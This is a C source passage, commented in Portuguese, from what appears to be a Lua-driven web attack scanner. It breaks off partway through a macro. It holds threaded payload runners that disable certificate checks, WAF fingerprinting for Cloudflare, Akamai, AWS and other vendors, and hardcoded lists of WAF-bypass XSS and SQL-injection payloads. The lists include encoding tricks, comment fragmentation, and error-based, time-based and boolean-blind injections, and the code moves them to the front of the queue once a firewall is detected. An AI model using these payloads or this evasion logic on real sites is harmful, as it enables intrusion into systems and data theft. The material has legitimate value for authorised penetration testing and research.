// ── Macro auxiliar: lança threads para array de payloads (builtin ou do arquivo) ──
// Usada por todos os scanners para suportar mod.xss(url) e mod.xss(url, "/path/file.txt")
#define SCANNER_RUN(label, banner_color, worker_fn, builtin_arr, builtin_count, timeout_val, summary_name) \
do { \
    const char *_target_raw = luaL_checkstring(L, 1); \
    char target[1024]; memset(target,0,sizeof(target)); { int _si=0; for(int _i=0;_target_raw[_i]&&_si<1023;_i++){ unsigned char _c=(unsigned char)_target_raw[_i]; if(_c=='\r'||_c=='\n'||_c=='\0') continue; target[_si++]=(char)_c; } } \
    const char *custom_file = luaL_optstring(L, 2, NULL); \
    MOD_RESET(); \
    char **use_payloads = NULL; \
    int    use_count    = 0; \
    int    from_file    = 0; \
    /* Tenta carregar arquivo customizado */ \
    if(custom_file && strlen(custom_file) > 0) { \
        int fc = 0; \
        char **fa = load_payloads_file(custom_file, &fc); \
        if(fa && fc > 0) { \
            use_payloads = fa; \
            use_count    = fc; \
            from_file    = 1; \
        } else { \
            printf("\033[1;31m[!] Arquivo não encontrado ou vazio: %s\033[0m\n", custom_file); \
            printf("\033[1;33m[*] Usando payloads padrão...\033[0m\n"); \
        } \
    } \
    if(!from_file) { \
        /* Usa array builtin — cria array de ponteiros para ele */ \
        use_count = builtin_count; \
        use_payloads = (char**)malloc(sizeof(char*) * use_count); \
        if(use_payloads) \
            for(int _i=0; _i<use_count; _i++) use_payloads[_i] = (char*)(builtin_arr[_i]); \
    } \
    printf("\n\033[1;" banner_color "m╔═══════════════════════════════════════╗\033[0m\n"); \
    printf("\033[1;" banner_color "m║  %-39s║\033[0m\n", label); \
    printf("\033[1;" banner_color "m╚═══════════════════════════════════════╝\033[0m\n\n"); \
    printf("\033[1;33m[*] Target: %s\033[0m\n", target); \
    if(from_file) \
        printf("\033[1;36m[*] Payloads: %d (arquivo: %s)\033[0m\n\n", use_count, custom_file); \
    else \
        printf("\033[1;33m[*] Payloads: %d (padrão) em paralelo...\033[0m\n\n", use_count); \
    if(use_payloads && use_count > 0) { \
        /* Calcula baseline: GET no target com valores benignos para comparação.
         * Tenta 3 valores diferentes e usa o maior (evita 404→0 bytes). */ \
        size_t _baseline_len = 0; \
        { \
            const char *_bl_vals[] = {"1", "test", "a", NULL}; \
            for(int _bvi=0; _bl_vals[_bvi]; _bvi++) { \
                char _bl_url[1100]; \
                snprintf(_bl_url, sizeof(_bl_url), "%s%s", target, _bl_vals[_bvi]); \
                CURL *_bl_ch = curl_easy_init(); \
                if(_bl_ch) { \
                    WorkBuf _bl_wb = {0}; _bl_wb.buf = malloc(131072); _bl_wb.cap = 131072; \
                    curl_easy_setopt(_bl_ch, CURLOPT_URL,            _bl_url); \
                    curl_easy_setopt(_bl_ch, CURLOPT_WRITEFUNCTION,  worker_write_cb); \
                    curl_easy_setopt(_bl_ch, CURLOPT_WRITEDATA,      &_bl_wb); \
                    curl_easy_setopt(_bl_ch, CURLOPT_TIMEOUT,        (long)timeout_val); \
                    curl_easy_setopt(_bl_ch, CURLOPT_CONNECTTIMEOUT, 5L); \
                    curl_easy_setopt(_bl_ch, CURLOPT_SSL_VERIFYPEER, 0L); \
                    curl_easy_setopt(_bl_ch, CURLOPT_SSL_VERIFYHOST, 0L); \
                    curl_easy_setopt(_bl_ch, CURLOPT_FOLLOWLOCATION, 1L); \
                    curl_easy_perform(_bl_ch); \
                    curl_easy_cleanup(_bl_ch); \
                    if(_bl_wb.len > _baseline_len) _baseline_len = _bl_wb.len; \
                    free(_bl_wb.buf); \
                } \
            } \
        } \
        /* Thread pool em lotes de 16 — seguro no Termux com recursos limitados */ \
        int _BATCH = 16; \
        pthread_t _pool[16]; \
        int _done = 0; \
        while(_done < use_count) { \
            int _n = use_count - _done; if(_n > _BATCH) _n = _BATCH; \
            for(int _i=0;_i<_n;_i++){ \
                test_arg_t *ta=calloc(1,sizeof(test_arg_t)); \
                strncpy(ta->payload,use_payloads[_done+_i],511); \
                strncpy(ta->target,target,1023); ta->timeout=timeout_val; \
                ta->baseline_len = _baseline_len; \
                pthread_create(&_pool[_i],NULL,worker_fn,ta); \
            } \
            for(int _i=0;_i<_n;_i++) pthread_join(_pool[_i],NULL); \
            _done+=_n; \
            if(_done < use_count) \
                printf("\033[0;90m  [%d/%d]\033[0m\n",_done,use_count); \
        } \
    } \
    MOD_SUMMARY(summary_name, use_count); \
    if(from_file) free_payloads(use_payloads, use_count); \
    else if(use_payloads) free(use_payloads); \
    /* Retorna vulnerabilidades únicas (deduplicadas por endpoint) */ \
    lua_pushinteger(L, (int)atomic_load(&g_vuln_count)); return 1; \
} while(0)

/* Variante sequencial (1 payload por vez) — para scanners cujos workers
   fazem fork/exec no servidor alvo (ex: SSTI com eval) */
#define SCANNER_RUN_SEQ(label, banner_color, worker_fn, builtin_arr, builtin_count, timeout_val, summary_name) \
do { \
    const char *_target_raw = luaL_checkstring(L, 1); \
    char target[1024]; memset(target,0,sizeof(target)); { int _si=0; for(int _i=0;_target_raw[_i]&&_si<1023;_i++){ unsigned char _c=(unsigned char)_target_raw[_i]; if(_c=='\r'||_c=='\n'||_c=='\0') continue; target[_si++]=(char)_c; } } \
    const char *custom_file = luaL_optstring(L, 2, NULL); \
    MOD_RESET(); \
    char **use_payloads = NULL; \
    int    use_count    = 0; \
    int    from_file    = 0; \
    if(custom_file && strlen(custom_file) > 0) { \
        int fc = 0; \
        char **fa = load_payloads_file(custom_file, &fc); \
        if(fa && fc > 0) { use_payloads = fa; use_count = fc; from_file = 1; } \
        else { printf("\033[1;31m[!] Arquivo não encontrado ou vazio: %s\033[0m\n", custom_file); \
               printf("\033[1;33m[*] Usando payloads padrão...\033[0m\n"); } \
    } \
    if(!from_file) { \
        use_count = builtin_count; \
        use_payloads = (char**)malloc(sizeof(char*) * use_count); \
        if(use_payloads) for(int _i=0; _i<use_count; _i++) use_payloads[_i] = (char*)(builtin_arr[_i]); \
    } \
    printf("\n\033[1;" banner_color "m╔═══════════════════════════════════════╗\033[0m\n"); \
    printf("\033[1;" banner_color "m║  %-39s║\033[0m\n", label); \
    printf("\033[1;" banner_color "m╚═══════════════════════════════════════╝\033[0m\n\n"); \
    printf("\033[1;33m[*] Target: %s\033[0m\n", target); \
    if(from_file) \
        printf("\033[1;36m[*] Payloads: %d (arquivo: %s) sequencial...\033[0m\n\n", use_count, custom_file); \
    else \
        printf("\033[1;33m[*] Payloads: %d (padrão) sequencial...\033[0m\n\n", use_count); \
    if(use_payloads && use_count > 0) { \
        size_t _baseline_len = 0; \
        { \
            const char *_bl_vals[] = {"1", "test", "a", NULL}; \
            for(int _bvi=0; _bl_vals[_bvi]; _bvi++) { \
                char _bl_url[1100]; snprintf(_bl_url, sizeof(_bl_url), "%s%s", target, _bl_vals[_bvi]); \
                CURL *_bl_ch = curl_easy_init(); \
                if(_bl_ch) { \
                    WorkBuf _bl_wb = {0}; _bl_wb.buf = malloc(131072); _bl_wb.cap = 131072; \
                    curl_easy_setopt(_bl_ch, CURLOPT_URL,            _bl_url); \
                    curl_easy_setopt(_bl_ch, CURLOPT_WRITEFUNCTION,  worker_write_cb); \
                    curl_easy_setopt(_bl_ch, CURLOPT_WRITEDATA,      &_bl_wb); \
                    curl_easy_setopt(_bl_ch, CURLOPT_TIMEOUT,        (long)timeout_val); \
                    curl_easy_setopt(_bl_ch, CURLOPT_CONNECTTIMEOUT, 5L); \
                    curl_easy_setopt(_bl_ch, CURLOPT_SSL_VERIFYPEER, 0L); \
                    curl_easy_setopt(_bl_ch, CURLOPT_SSL_VERIFYHOST, 0L); \
                    curl_easy_setopt(_bl_ch, CURLOPT_FOLLOWLOCATION, 1L); \
                    curl_easy_perform(_bl_ch); curl_easy_cleanup(_bl_ch); \
                    if(_bl_wb.len > _baseline_len) _baseline_len = _bl_wb.len; \
                    free(_bl_wb.buf); \
                } \
            } \
        } \
        for(int _i=0; _i<use_count; _i++) { \
            test_arg_t *ta = calloc(1, sizeof(test_arg_t)); \
            if(!ta) continue; \
            strncpy(ta->payload, use_payloads[_i], 511); \
            strncpy(ta->target, target, 1023); \
            ta->timeout = timeout_val; \
            ta->baseline_len = _baseline_len; \
            worker_fn(ta); \
        } \
    } \
    MOD_SUMMARY(summary_name, use_count); \
    if(from_file) free_payloads(use_payloads, use_count); \
    else if(use_payloads) free(use_payloads); \
    /* Retorna vulnerabilidades únicas (deduplicadas por endpoint) */ \
    lua_pushinteger(L, (int)atomic_load(&g_vuln_count)); return 1; \
} while(0)



/* ─── SCANNER_RUN_AUTO ──────────────────────────────────────────────────── */
/* Se URL sem ?param=: spider automático.                                   */
/* Se URL com ?param=: scanner direto normal.                               */
/* Arg 3 (opcional): N endpoints a testar. 0=todos. Padrão=1.              */
/* Ex: mod.lfi(url)       → só o primeiro                                  */
/*     mod.lfi(url,nil,3) → primeiros 3                                    */
/*     mod.lfi(url,nil,0) → todos                                          */

/* ─── WAF Detection + Payload Smart Queue ────────────────────────────────────
 * waf_detect()   — probe com payload óbvio, identifica WAF pela resposta
 * waf_sort_payloads() — reordena payloads priorizando bypass quando WAF ativo
 * ──────────────────────────────────────────────────────────────────────────── */

/* ── FIX 2: WAF detection por comportamento + fingerprint de header ──────
 * Detecção em dois passos:
 * 1. Request limpa (sem payload) — captura headers normais para baseline
 * 2. Request com payload XSS óbvio — compara: 403/429 = bloqueio = WAF
 * Google Frontend detectado por "via: 1.1 google" ou "server: gfe"
 * ─────────────────────────────────────────────────────────────────────── */
typedef enum {
    WAF_NONE = 0,
    WAF_CLOUDFLARE,
    WAF_AKAMAI,
    WAF_SUCURI,
    WAF_MODSECURITY,
    WAF_WORDFENCE,
    WAF_IMPERVA,
    WAF_GOOGLE_FRONTEND,
    WAF_AWS_WAF,
    WAF_FASTLY,
    WAF_AZURE_FRONT_DOOR,
    WAF_GENERIC
} WafType;

static const char *waf_name(WafType w) {
    switch(w) {
        case WAF_CLOUDFLARE:       return "Cloudflare";
        case WAF_AKAMAI:           return "Akamai";
        case WAF_SUCURI:           return "Sucuri";
        case WAF_MODSECURITY:      return "ModSecurity";
        case WAF_WORDFENCE:        return "Wordfence";
        case WAF_IMPERVA:          return "Imperva/Incapsula";
        case WAF_GOOGLE_FRONTEND:  return "Google Frontend (GFE/GWS)";
        case WAF_AWS_WAF:          return "AWS WAF / Shield";
        case WAF_FASTLY:           return "Fastly CDN";
        case WAF_AZURE_FRONT_DOOR: return "Azure Front Door";
        case WAF_GENERIC:          return "WAF generico (comportamental)";
        default:                   return "nenhum";
    }
}

static WafType waf_detect(const char *target_url) {

    /* ── Passo 0: resolve IP e verifica ASN via ip-api.com ──────────────
     * Evita falsos positivos: só marca Cloudflare/Akamai/etc se o IP
     * realmente pertence ao ASN deles.
     * ASNs conhecidos:
     *   Cloudflare : AS13335
     *   Akamai     : AS20940, AS16625
     *   Fastly     : AS54113
     *   AWS        : AS16509, AS14618
     *   Azure/MS   : AS8075
     *   Google     : AS15169, AS396982
     *   Meta/FB    : AS32934
     * ──────────────────────────────────────────────────────────────── */
    WafType asn_hint = WAF_NONE;
    {
        /* Extrai hostname da URL */
        char host[256]={0};
        const char *after_proto = strstr(target_url,"://");
        if (after_proto) {
            after_proto+=3;
            int hi=0;
            while(*after_proto && *after_proto!='/' && *after_proto!=':' && hi<255)
                host[hi++]=*after_proto++;
        }
        if (host[0]) {
            /* Resolve IP via getaddrinfo */
            char ip[64]={0};
            struct addrinfo hints_ai={0}, *res=NULL;
            hints_ai.ai_family=AF_UNSPEC;
            hints_ai.ai_socktype=SOCK_STREAM;
            if (getaddrinfo(host,NULL,&hints_ai,&res)==0 && res) {
                if (res->ai_family==AF_INET) {
                    struct sockaddr_in *sin=(struct sockaddr_in*)res->ai_addr;
                    inet_ntop(AF_INET,&sin->sin_addr,ip,sizeof(ip));
                } else if (res->ai_family==AF_INET6) {
                    struct sockaddr_in6 *sin6=(struct sockaddr_in6*)res->ai_addr;
                    inet_ntop(AF_INET6,&sin6->sin6_addr,ip,sizeof(ip));
                }
                freeaddrinfo(res);
            }

            if (ip[0]) {
                /* Consulta ASN via ip-api.com (JSON, gratuito, sem chave) */
                char api_url[256]={0};
                snprintf(api_url,sizeof(api_url),
                    "http://ip-api.com/json/%s?fields=as,org",ip);
                CURL *ac=curl_easy_init();
                if (ac) {
                    WorkBuf awb={0}; awb.buf=malloc(512); awb.cap=512;
                    curl_easy_setopt(ac,CURLOPT_URL,           api_url);
                    curl_easy_setopt(ac,CURLOPT_WRITEFUNCTION, worker_write_cb);
                    curl_easy_setopt(ac,CURLOPT_WRITEDATA,     &awb);
                    curl_easy_setopt(ac,CURLOPT_TIMEOUT,       5L);
                    curl_easy_setopt(ac,CURLOPT_CONNECTTIMEOUT,3L);
                    curl_easy_setopt(ac,CURLOPT_SSL_VERIFYPEER,0L);
                    curl_easy_perform(ac);
                    curl_easy_cleanup(ac);

                    const char *aj=awb.buf?awb.buf:"";
                    /* Identifica ASN pelo número ou org */
                    if      (strstr(aj,"AS13335")||strstr(aj,"Cloudflare"))
                        asn_hint=WAF_CLOUDFLARE;
                    else if (strstr(aj,"AS20940")||strstr(aj,"AS16625")||strstr(aj,"Akamai"))
                        asn_hint=WAF_AKAMAI;
                    else if (strstr(aj,"AS54113")||strstr(aj,"Fastly"))
                        asn_hint=WAF_FASTLY;
                    else if (strstr(aj,"AS16509")||strstr(aj,"AS14618")||strstr(aj,"Amazon"))
                        asn_hint=WAF_AWS_WAF;
                    else if (strstr(aj,"AS8075")||strstr(aj,"Microsoft"))
                        asn_hint=WAF_AZURE_FRONT_DOOR;
                    else if (strstr(aj,"AS15169")||strstr(aj,"AS396982")||strstr(aj,"Google"))
                        asn_hint=WAF_GOOGLE_FRONTEND;
                    /* Meta/Facebook — sabemos que não é nenhum WAF externo */
                    /* asn_hint fica WAF_NONE — forçará verificação só por headers próprios */
                    free(awb.buf);
                }
            }
        }
    }

    /* ── Passo 1: request limpa — coleta headers normais ── */
    long baseline_code = 0;
    size_t baseline_len = 0;
    {
        CURL *ch=curl_easy_init(); if(!ch) goto waf_probe;
        WorkBuf wb={0}; wb.buf=malloc(32768); wb.cap=32768;
        curl_easy_setopt(ch,CURLOPT_URL,           target_url);
        curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION, worker_write_cb);
        curl_easy_setopt(ch,CURLOPT_WRITEDATA,     &wb);
        curl_easy_setopt(ch,CURLOPT_TIMEOUT,       8L);
        curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,5L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYHOST,0L);
        curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
        curl_easy_setopt(ch,CURLOPT_MAXREDIRS,     5L);
        curl_easy_setopt(ch,CURLOPT_HEADER,        1L);
        curl_easy_setopt(ch,CURLOPT_USERAGENT,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124");
        curl_easy_perform(ch);
        curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&baseline_code);
        baseline_len=wb.len;

        const char *b=wb.buf?wb.buf:"";
        WafType waf_from_headers=WAF_NONE;

        /* ── Google ── */
        if(buf_icontains(b,wb.len,"via: 1.1 google")||
           buf_icontains(b,wb.len,"server: gfe")||
           buf_icontains(b,wb.len,"server: gws")||        /* Google Web Server */
           buf_icontains(b,wb.len,"x-gfe-request-trace")||
           buf_icontains(b,wb.len,"x-google-")||
           buf_icontains(b,wb.len,"google-edge-cache")||
           buf_icontains(b,wb.len,"alt-svc: h3")&&        /* Google usa QUIC/h3 */
           (strstr(target_url,"google.")||strstr(target_url,"youtube.")))
            waf_from_headers=WAF_GOOGLE_FRONTEND;
        /* ── Cloudflare ── */
        else if(buf_icontains(b,wb.len,"cf-ray")||
                buf_icontains(b,wb.len,"__cf_bm")||
                buf_icontains(b,wb.len,"cf-cache-status")||
                buf_icontains(b,wb.len,"server: cloudflare")||
                buf_icontains(b,wb.len,"cloudflare"))
            waf_from_headers=WAF_CLOUDFLARE;
        /* ── Akamai ── */
        else if(buf_icontains(b,wb.len,"ak_bmsc")||
                buf_icontains(b,wb.len,"akamai")||
                buf_icontains(b,wb.len,"x-akamai-")||
                buf_icontains(b,wb.len,"akamaighost")||
                buf_icontains(b,wb.len,"x-check-cacheable"))
            waf_from_headers=WAF_AKAMAI;
        /* ── Sucuri ── */
        else if(buf_icontains(b,wb.len,"x-sucuri-id")||
                buf_icontains(b,wb.len,"sucuri")||
                buf_icontains(b,wb.len,"x-sucuri-cache"))
            waf_from_headers=WAF_SUCURI;
        /* ── Imperva/Incapsula ── */
        else if(buf_icontains(b,wb.len,"incapsula")||
                buf_icontains(b,wb.len,"imperva")||
                buf_icontains(b,wb.len,"visid_incap")||
                buf_icontains(b,wb.len,"incap_ses")||
                buf_icontains(b,wb.len,"x-iinfo"))
            waf_from_headers=WAF_IMPERVA;
        /* ── ModSecurity ── */
        else if(buf_icontains(b,wb.len,"mod_security")||
                buf_icontains(b,wb.len,"modsecurity")||
                buf_icontains(b,wb.len,"x-modsec")||
                buf_icontains(b,wb.len,"NOYB"))
            waf_from_headers=WAF_MODSECURITY;
        /* ── Wordfence ── */
        else if(buf_icontains(b,wb.len,"wordfence")||
                buf_icontains(b,wb.len,"generated by wordfence"))
            waf_from_headers=WAF_WORDFENCE;
        /* ── AWS WAF ── */
        else if(buf_icontains(b,wb.len,"x-amzn-requestid")||
                buf_icontains(b,wb.len,"x-amz-cf-id")||
                buf_icontains(b,wb.len,"x-amz-rid")||
                buf_icontains(b,wb.len,"awselb")||
                buf_icontains(b,wb.len,"aws-waf"))
            waf_from_headers=WAF_AWS_WAF;
        /* ── Fastly ── */
        else if(buf_icontains(b,wb.len,"x-fastly-request-id")||
                buf_icontains(b,wb.len,"fastly-restarts")||
                buf_icontains(b,wb.len,"x-served-by")&&buf_icontains(b,wb.len,"cache-"))
            waf_from_headers=WAF_FASTLY;
        /* ── Azure Front Door ── */
        else if(buf_icontains(b,wb.len,"x-azure-ref")||
                buf_icontains(b,wb.len,"x-fd-healthprobe")||
                buf_icontains(b,wb.len,"x-msedge-ref"))
            waf_from_headers=WAF_AZURE_FRONT_DOOR;

        curl_easy_cleanup(ch);
        free(wb.buf);

        /* ── Validação cruzada: header só confirma se ASN bate ──
         * Se asn_hint é WAF_NONE (ex: Meta/Facebook, infra própria),
         * rejeita qualquer fingerprint de WAF externo por header.
         * Se asn_hint bate com waf_from_headers → confirma.
         * Se asn_hint é desconhecido (falhou a consulta) → confia no header. */
        if(waf_from_headers != WAF_NONE) {
            int asn_ok = (asn_hint == WAF_NONE) ? 1 : /* ASN lookup falhou — confia no header */
                         (asn_hint == waf_from_headers);
            /* Casos especiais: Google detectado por URL mesmo sem ASN confirmar */
            if(waf_from_headers==WAF_GOOGLE_FRONTEND &&
               (strstr(target_url,"google.")||strstr(target_url,"youtube.")||
                strstr(target_url,"googleapis.")))
                asn_ok=1;
            if(asn_ok) return waf_from_headers;
            /* ASN não bate — descarta fingerprint de header, continua para probe */
        }
    }

    waf_probe:;
    /* ── Passo 2: request com payload óbvio — detecta bloqueio comportamental ── */
    const char *probe="<script>alert(1)</script>union+select+1,2,3--";
    char enc[512]={0}; url_encode(probe,enc,sizeof(enc));
    char url[2048]={0}; snprintf(url,sizeof(url),"%s%s",target_url,enc);

    CURL *ch=curl_easy_init(); if(!ch) return WAF_NONE;
    WorkBuf wb={0}; wb.buf=malloc(32768); wb.cap=32768;
    curl_easy_setopt(ch,CURLOPT_URL,           url);
    curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION, worker_write_cb);
    curl_easy_setopt(ch,CURLOPT_WRITEDATA,     &wb);
    curl_easy_setopt(ch,CURLOPT_TIMEOUT,       8L);
    curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,5L);
    curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
    curl_easy_setopt(ch,CURLOPT_SSL_VERIFYHOST,0L);
    curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,0L); /* não seguir redirect — queremos o bloqueio */
    curl_easy_setopt(ch,CURLOPT_HEADER,        1L);
    curl_easy_setopt(ch,CURLOPT_USERAGENT,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124");
    curl_easy_perform(ch);
    long code=0; curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&code);
    curl_easy_cleanup(ch);

    const char *b=wb.buf?wb.buf:"";
    WafType waf=WAF_NONE;

    /* ── Fingerprint por body/headers da resposta ao payload ── */
    /* Google */
    if(buf_icontains(b,wb.len,"via: 1.1 google")||
       buf_icontains(b,wb.len,"server: gfe")||
       buf_icontains(b,wb.len,"server: gws")||
       buf_icontains(b,wb.len,"x-google-")||
       (code==429&&(strstr(target_url,"google.")||strstr(target_url,"youtube."))))
        waf=WAF_GOOGLE_FRONTEND;
    /* Cloudflare */
    else if(buf_icontains(b,wb.len,"cloudflare")||
            buf_icontains(b,wb.len,"cf-ray")||
            buf_icontains(b,wb.len,"cf-cache-status")||
            buf_icontains(b,wb.len,"__cf_bm"))
        waf=WAF_CLOUDFLARE;
    /* Akamai */
    else if(buf_icontains(b,wb.len,"akamai")||
            buf_icontains(b,wb.len,"ak_bmsc")||
            buf_icontains(b,wb.len,"reference #")||
            buf_icontains(b,wb.len,"x-akamai-"))
        waf=WAF_AKAMAI;
    /* Sucuri */
    else if(buf_icontains(b,wb.len,"sucuri")||
            buf_icontains(b,wb.len,"x-sucuri-id"))
        waf=WAF_SUCURI;
    /* ModSecurity */
    else if(buf_icontains(b,wb.len,"mod_security")||
            buf_icontains(b,wb.len,"modsecurity")||
            buf_icontains(b,wb.len,"NOYB")||
            (code==403&&buf_icontains(b,wb.len,"mod_")))
        waf=WAF_MODSECURITY;
    /* Wordfence */
    else if(buf_icontains(b,wb.len,"wordfence"))
        waf=WAF_WORDFENCE;
    /* Imperva */
    else if(buf_icontains(b,wb.len,"incapsula")||
            buf_icontains(b,wb.len,"imperva")||
            buf_icontains(b,wb.len,"visid_incap")||
            buf_icontains(b,wb.len,"incap_ses"))
        waf=WAF_IMPERVA;
    /* AWS WAF */
    else if(buf_icontains(b,wb.len,"x-amzn-requestid")||
            buf_icontains(b,wb.len,"x-amz-cf-id")||
            buf_icontains(b,wb.len,"awselb")||
            buf_icontains(b,wb.len,"aws-waf")||
            (code==403&&buf_icontains(b,wb.len,"request blocked")))
        waf=WAF_AWS_WAF;
    /* Fastly */
    else if(buf_icontains(b,wb.len,"x-fastly-request-id")||
            buf_icontains(b,wb.len,"fastly-restarts"))
        waf=WAF_FASTLY;
    /* Azure Front Door */
    else if(buf_icontains(b,wb.len,"x-azure-ref")||
            buf_icontains(b,wb.len,"x-msedge-ref")||
            (code==403&&buf_icontains(b,wb.len,"microsoft")))
        waf=WAF_AZURE_FRONT_DOOR;
    /* ── Detecção comportamental — WAF genérico ──
     * Casos: 403/406/429 com body de bloqueio
     *        302 redirect para página de challenge/captcha
     *        corpo muito menor que baseline (página de bloqueio curta) */
    else {
        int blocked_code = (code==403||code==406||code==429||code==503);
        int redirect_challenge = (code==302||code==301) &&
            (buf_icontains(b,wb.len,"captcha")||
             buf_icontains(b,wb.len,"challenge")||
             buf_icontains(b,wb.len,"security-check")||
             buf_icontains(b,wb.len,"robot")||
             buf_icontains(b,wb.len,"/sorry/")); /* google /sorry/ page */
        int block_body = buf_icontains(b,wb.len,"blocked")||
                         buf_icontains(b,wb.len,"access denied")||
                         buf_icontains(b,wb.len,"forbidden")||
                         buf_icontains(b,wb.len,"security")||
                         buf_icontains(b,wb.len,"firewall")||
                         buf_icontains(b,wb.len,"rate limit")||
                         buf_icontains(b,wb.len,"too many request")||
                         buf_icontains(b,wb.len,"unusual traffic")||  /* Google */
                         buf_icontains(b,wb.len,"automated")||
                         buf_icontains(b,wb.len,"captcha")||
                         buf_icontains(b,wb.len,"robot");
        int size_drop = baseline_len>200 && wb.len < baseline_len/3;

        if(redirect_challenge)
            waf=WAF_GENERIC;
        else if(blocked_code && (block_body||size_drop))
            waf=WAF_GENERIC;
        else if(code==429 && baseline_code==200)
            waf=WAF_GENERIC;
        else if(baseline_code==200 && (code==403||code==406) && size_drop)
            waf=WAF_GENERIC;
    }

    /* ── Validação final por ASN ──
     * Para WAFs específicos (não genérico), só confirma se ASN bate.
     * WAF_GENERIC comportamental não precisa de ASN — é baseado em comportamento. */
    if(waf != WAF_NONE && waf != WAF_GENERIC && asn_hint != WAF_NONE) {
        if(asn_hint != waf) waf = WAF_NONE; /* ASN contradiz fingerprint — descarta */
    }

    free(wb.buf);
    return waf;
}

/* Payloads de bypass por WAF — prefixados na fila quando WAF detectado */
/* Técnicas: case variation, encoding duplo, fragmentação, comments */
static const char *waf_bypass_xss[] = {
    /* ── Genéricos (funcionam na maioria dos WAFs) ── */
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<svg/onload=alert(1)>",
    "<img src=x oNeRrOr=alert(1)>",
    "<img src=x ONERROR=alert(1)>",
    /* ── Fragmentação com HTML comments ── */
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    "<s<script>cript>alert(1)</s</script>cript>",
    /* ── Whitespace / newline bypass ── */
    "<script\t>alert(1)</script>",
    "<script\r\n>alert(1)</script>",
    "<script >alert(1)</script>",
    /* ── Encoding duplo ── */
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    /* ── HTML entities no handler ── */
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
    /* ── Sem aspas / backtick ── */
    "<img src=x onerror=alert`1`>",
    "<svg onload=alert`1`>",
    /* ── Cloudflare específico ── */
    "<details/open/ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    /* ── Akamai específico ── */
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    /* ── ModSecurity bypass ── */
    "<a href=javascript&colon;alert(1)>click</a>",
    "<a href=&#106;avascript:alert(1)>click</a>",
    /* ── Data URI ── */
    "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
    "<object data=\"data:text/html,<script>alert(1)</script>\">",
    /* ── SVG avançado ── */
    "<svg><script>alert&#40;1&#41;</script>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    /* ── DOM-based ── */
    "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    NULL
};

static const char *waf_bypass_sqli[] = {
    /* ── Genéricos ── */
    "1'/**/OR/**/1=1--",
    "1' OR/**/ 1=1--",
    "1'||'1'='1",
    /* ── Case variation ── */
    "1' oR 1=1--",
    "1' Or 1=1--",
    "1' OR 1=1--+-",
    /* ── Whitespace alternativo ── */
    "1'\tor\t1=1--",
    "1'\nor\n1=1--",
    "1'%09OR%091=1--",
    /* ── Encoding ── */
    "1%27%20OR%201%3D1--",
    "1%2527%2520OR%25201%253D1--",
    /* ── Hex encoding ── */
    "1' OR 0x31=0x31--",
    "1' OR 0x313D31--",
    /* ── Cloudflare bypass ── */
    "1'/*!OR*/1=1--",
    "1'/*!50000OR*/1=1--",
    "1' /*!UNION*/ /*!SELECT*/ 1,2,3--",
    /* ── ModSecurity bypass ── */
    "1' UNION%23foo*%0D%0Abar%0D%0ASELECT%231%0D%0A%231%0D%0A1,2,3--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    /* ── Stacked queries ── */
    "1'; WAITFOR DELAY '0:0:1'--",
    "1'; SELECT SLEEP(1)--",
    /* ── Boolean blind ── */
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' AND SUBSTR(version(),1,1)='5'--",
    NULL
};

/* Reordena array de payloads: coloca bypasses no início, resto depois */
static char **waf_sort_payloads(
        char **original, int orig_count,
        const char **bypasses,
        int *new_count)
{
    /* conta bypasses */
    int bp_count = 0;
    if (bypasses) while (bypasses[bp_count]) bp_count++;

    int total = bp_count + orig_count;
    char **sorted = (char**)malloc(sizeof(char*) * (size_t)(total + 1));
    if (!sorted) { *new_count = orig_count; return original; }

    int idx = 0;
    /* primeiro os bypasses */
    for (int i = 0; i < bp_count; i++)
        sorted[idx++] = (char*)bypasses[i];
    /* depois os originais */
    for (int i = 0; i < orig_count; i++)
        sorted[idx++] = original[i];
    sorted[idx] = NULL;
    *new_count = total;
    return sorted;
}

#define SCANNER_RUN_AUTO(label, banner_color, worker_fn, builtin_arr, builtin_count, timeout_val, summary_name) \
do { \
    const char *_u_raw = luaL_checkstring(L, 1); \
    char _u_buf[1024]={0}; \
    const char *_u = normalize_url(_u_raw, _u_buf, sizeof(_u_buf)); \
    const char *_le = strrchr(_u,'='); const char *_qm = strchr(_u,'?'); \
    int _auto_mode = !(_le && _qm && _le > _qm); \
    /* arg 3: limite de endpoints. 0=todos, padrão=1 */ \
    int _ep_limit = (int)luaL_optinteger(L, 3, 1); \
    \
    /* Monta lista de targets: spider ou URL direta */ \
    char **_ts = NULL; int _tc = 0; \
    char *_single_target[1]; \
    if (_auto_mode) { \
        _ts = collect_scan_targets(_u, &_tc); \
        if (!_ts || _tc == 0) { \
            printf("\033[0;31m[!] Spider não encontrou endpoints com parâmetros.\033[0m\n"); \
            printf("\033[0;90m    Use: mod.%s('http://site.com/page?id=')\033[0m\n\n", summary_name); \
